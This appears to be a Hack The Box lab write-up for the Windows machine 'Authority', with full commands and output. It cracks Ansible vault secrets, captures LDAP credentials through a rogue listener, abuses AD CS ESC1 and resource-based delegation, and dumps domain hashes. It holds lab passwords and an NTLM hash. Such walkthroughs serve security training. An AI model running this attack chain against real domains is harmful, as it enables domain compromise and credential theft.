<div class="htb-box-info medium">
  <div class="box-header">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cd-b114-478f-87a8-3d12347658a2.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Windows</td></tr>
        <tr><td>Difficulty:</td><td>Medium</td></tr>
        <tr><td>Release:</td><td>15 Jul 2023</td></tr>
      </table>
    </div>
  </div>
</div>

---


# enumeration:
fast scan
```bash
nmap -p- --min-rate 1000 --open 10.129.229.56
```

```
PORT      STATE SERVICE
53/tcp    open  domain      
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc       
139/tcp   open  netbios-ssn
389/tcp   open  ldap                 
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5 
593/tcp   open  http-rpc-epmap       
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP        
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman                
8443/tcp  open  https-alt    
9389/tcp  open  adws            
47001/tcp open  winrm
```

scan for service detection and using default nmap scripts:
```bash
sudo nmap -v -sV -sC -p 53,88,80,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001 10.129.229.56
```

```
PORT      STATE SERVICE       VERSION                                                         
53/tcp    open  domain        (generic dns response: SERVFAIL)                                
| fingerprint-strings:                                                                        
|   DNSVersionBindReqTCP:                                                                     
|     version                                 
|_    bind                                    
80/tcp    open  http          Microsoft IIS httpd 10.0                                        
|_http-title: IIS Windows Server                                                                                                                                                            
|_http-server-header: Microsoft-IIS/10.0                                                      
| http-methods:                                                                                                                                                                             
|   Supported Methods: OPTIONS TRACE GET HEAD POST                                            
|_  Potentially risky methods: TRACE                                                                                                                                                        
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-05 08:24:27Z)  
135/tcp   open  msrpc         Microsoft Windows RPC                                           
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                   
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)                                                                
| ssl-cert: Subject:                                                                          
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB                                                                               
| Issuer: commonName=htb-AUTHORITY-CA                                                         
| Public Key type: rsa                                                                        
| Public Key bits: 2048                                                                                                                                                                     
| Signature Algorithm: sha256WithRSAEncryption                                                
| Not valid before: 2022-08-09T23:03:21                                                       
| Not valid after:  2024-08-09T23:13:21                                                                                                                                                     
| MD5:     d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1                                            
| SHA-1:   dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b                                  
|_SHA-256: e1d2 e894 2960 a961 bbf7 b4e4 c110 c6d7 e5a1 7a29 8987 85dc 3553 fb90 458a 5cb7    
|_ssl-date: 2026-10-05T08:25:19+00:00; +4h00m00s from scanner time.                           
445/tcp   open  microsoft-ds?          
464/tcp   open  kpasswd5?                                                                     
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)                                                                
| ssl-cert: Subject:                                                                          
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB                                                                               
| Issuer: commonName=htb-AUTHORITY-CA                                                         
| Public Key type: rsa                                                                                                                                                                      
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:     d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1
| SHA-1:   dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b
|_SHA-256: e1d2 e894 2960 a961 bbf7 b4e4 c110 c6d7 e5a1 7a29 8987 85dc 3553 fb90 458a 5cb7
|_ssl-date: 2026-10-05T08:25:18+00:00; +3h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)                                                                
|_ssl-date: 2026-10-05T08:25:19+00:00; +4h00m00s from scanner time.                           
| ssl-cert: Subject:                                                                          
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB                                                                               
| Issuer: commonName=htb-AUTHORITY-CA                                                         
| Public Key type: rsa                                                                        
| Public Key bits: 2048                                                                       
| Signature Algorithm: sha256WithRSAEncryption                                                
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21                                                       
| MD5:     d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1                                            
| SHA-1:   dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b                                                                                                                                
|_SHA-256: e1d2 e894 2960 a961 bbf7 b4e4 c110 c6d7 e5a1 7a29 8987 85dc 3553 fb90 458a 5cb7    
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)                                                                
| ssl-cert: Subject:                                                                          
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB                                                                               
| Issuer: commonName=htb-AUTHORITY-CA                                                         
| Public Key type: rsa                                                                        
| Public Key bits: 2048                
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21                                                       
| Not valid after:  2024-08-09T23:13:21                                                       
| MD5:     d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1                                            
| SHA-1:   dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b       
|_SHA-256: e1d2 e894 2960 a961 bbf7 b4e4 c110 c6d7 e5a1 7a29 8987 85dc 3553 fb90 458a 5cb7                                                                                                  
|_ssl-date: 2026-10-05T08:25:18+00:00; +3h59m59s from scanner time.                           
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                         
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-03T08:20:11
| Not valid after:  2028-10-04T19:58:35
| MD5:     a23f cda7 41ee 416b be70 58bf 88a5 fb3f
| SHA-1:   9c3d 5ca6 0069 1939 65a5 379e adb0 bf2f 33a2 23e0
|_SHA-256: c3ab 784a 29b3 6bda 5b45 179a 7e57 0137 bcbc e82c 7b3e 3f80 b52c 4a3c bcf4 24d4
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| tls-alpn:
|_  h2
9389/tcp  open  mc-nmf        .NET Message Framing                 
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.99%I=7%D=10/5%Time=6AC3267F%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x82\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");                 
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:   
| smb2-time:                                  
|   date: 2026-10-05T08:25:11          
|_  start_date: N/A                    
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m58s
| smb2-security-mode:                                                                         
|   3.1.1:                                                                                    
|_    Message signing enabled and required
```

not much useful info here. only domain. and that tomcat running on 8443...

smb null auth is work!

but i cant enum shares: [-] Error enumerating shares: STATUS_ACCESS_DENIED

guest auth is also there and we can enum shares!
```bash
netexec smb authority.htb -u 'zcx' -p '' --shares
```
![[Pasted image 20261005073220.png]]

I use smbclient to get in
![[Pasted image 20261005073806.png]]
there is some Ansible instance on the box..


### Ansible vault decrypt
I'll download all to anylize...

I watched this to get into what is Ansible) - https://www.youtube.com/watch?v=xRMPKQweySE

I found some encrypted passwords:
![[Pasted image 20261005074750.png]]

![[Pasted image 20261005075038.png]]

todo.md
```
- Change LDAP admin password after build -[COMPLETE]
- add tests for ubuntu 14, 16, debian 7 and 8, and centos 6 and 7
```

ok lets return to file cracking...

hash that I will try to crack
```
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
```

```bash
ansible2john hash > hashedvault
```

```bash
hashcat -m 16900 hashedvault --username /usr/share/wordlists/rockyou.txt
```

the pass is `!@#$%^&*`...


now decrypt vaults ( but before u have to put each hash into own file, it worked for me ):
![[Pasted image 20261005082904.png]]

read this for more info - https://notes.incendium.rocks/pentesting-notes/linux-pentesting/ansible

and this https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/

```bash
cat pwm_admin_login | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm

cat pwm_admin_password | ansible-vault decrypt
Vault password: 
Decryption successful
pWm_@dm!N_!23                                                                                                                                   
cat hash | ansible-vault decrypt
Vault password: 
Decryption successful
DevT3st@123 
```

lets test this credentials

![[Pasted image 20261005102037.png]]

no use...

lets take a look at web:


# svc_pwm
on port 80 default IIS page

on port 8443:
![[Pasted image 20261005101807.png]]

typed admin:admin ->
![[Pasted image 20261005101759.png]]

lets access "Configuration Manager"

enter svc_pwm password

and we got this page:
![[Pasted image 20261005102429.png]]

download configuration
![[Pasted image 20261005102539.png]]

on the top of this file we get:
```xml
<properties type="config">
        <property key="configIsEditable">true</property>
        <property key="configEpoch">0</property>
        <property key="configPasswordHash">$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua</property>
</properties>
```

```bash
hashcat hash1 /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20261005102816.png]]

lets try 3200 mode

```bash
hashcat hash1 -m 3200 /usr/share/wordlists/rockyou.txt
```

this is failed... I waited 3 mins I think i need to do smt else..

there is also this page:
![[Pasted image 20261005103028.png]]

there is nothing interesting too...

Lets check editor page...

this page is looks interesting. I set up listener... then I wrote my ip into url field like in the image below:
![[Pasted image 20261005105648.png]]

```bash
sudo nc -lvnp 389 > ldap_back_connection
```

here it is
![[Pasted image 20261005105916.png]]

test creds:
```bash
netexec ldap authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'

[+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
```


# svc_ldap
so we have new creds! `svc_ldap:lDaP_1n_th3_cle4r!`

we have new share to read
![[Pasted image 20261005204511.png]]

but it's all empty...
![[Pasted image 20261005204725.png]]


### Abuse ESC1
I saw some moves with ADCS. so lets check that out;
```bash
certipy-ad find -target authority.htb -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -vulnerable
```

and it found something:
![[Pasted image 20261005205008.png]]

So to start exploatation first I need administrator SPN to get it I can run:
```bash
certipy-ad account -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -user 'Administrator' read
```

```
[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=authority,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-622327497-3269355298-2248959698-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 66048
    whenCreated                         : 2022-08-09T22:53:10+00:00
    whenChanged                         : 2026-10-05T21:42:45+00:00
```

and it failed... and its not surprising.
```bash
certipy-ad req -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -target 'authority.authority.htb' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: authority.authority.htb.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 4
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): N
[-] Failed to request certificate
```

#### computer creation
```bash
netexec ldap authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq 
```
-> 10

I think i need to create a computer... 
```bash
bloodyAD -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -d authority.htb --host authority.htb add computer normalcomp 'Welcome123!'              
[+] normalcomp$ created
```

now run again:
```bash
certipy-ad req -u 'normalcomp$@authority.htb' -p 'Welcome123!' -dc-ip 10.129.229.56 -target 'authority.authority.htb' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'Administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'

[*] Saving certificate and private key to 'administrator.pfx'
```

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56
```

```
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

I googled a little and found out that i can access ldap shell
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
```


### add_user_to_group example
and here i can type
```bash
# add_user_to_group svc_ldap Administrators

Adding user: svc_ldap to group Administrators result: OK
```

but winrm is fucked me up too...
```bash
evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'

Error: Cannot establish connection to remote endpoint. Check credentials and network.

Error: NameError: uninitialized constant Net::NTLM::Client::SessionCrypto::CLIENT_TO_SERVER_SEALING
```

so I'll run in netexec one by one:
```bash
netexec winrm authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -x "whoami /groups"
```
I am added:
![[Pasted image 20261005213531.png]]

```bash
netexec winrm authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -x "type C:\Users\Administrator\Desktop\root.txt"
```

and user flag
```bash
netexec winrm authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -x "type C:\Users\svc_ldap\Desktop\user.txt"
```



### set_rbcd example

now I'll give `normalcomp$` right to act on behalf of domain computer:
```bash
# set_rbcd AUTHORITY$ normalcomp$
Found Target DN: CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
Target SID: S-1-5-21-622327497-3269355298-2248959698-1000

Found Grantee DN: CN=normalcomp,CN=Computers,DC=authority,DC=htb
Grantee SID: S-1-5-21-622327497-3269355298-2248959698-12101
Delegation rights modified successfully!
normalcomp$ can now impersonate users on AUTHORITY$ via S4U2Proxy
```

sync time...

now request ticket 
```bash
getST.py -spn 'CIFS/AUTHORITY.AUTHORITY.HTB' -impersonate Administrator -dc-ip 10.129.229.56 'authority.htb/normalcomp$:Welcome123!'

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@CIFS_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache
```

export it

now we can do a bunch of stuff to access. I'll dump ntds.dit using `secretsdump.py`
```bash
secretsdump.py 'authority.htb/Administrator@authority.authority.htb' -k -no-pass -just-dc-user Administrator

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
...SNIP
```

or we just could psexec in:
```bash
impacket-psexec -k -no-pass authority.htb/Administrator@authority.authority.htb
```
![[Pasted image 20261006120053.png]]
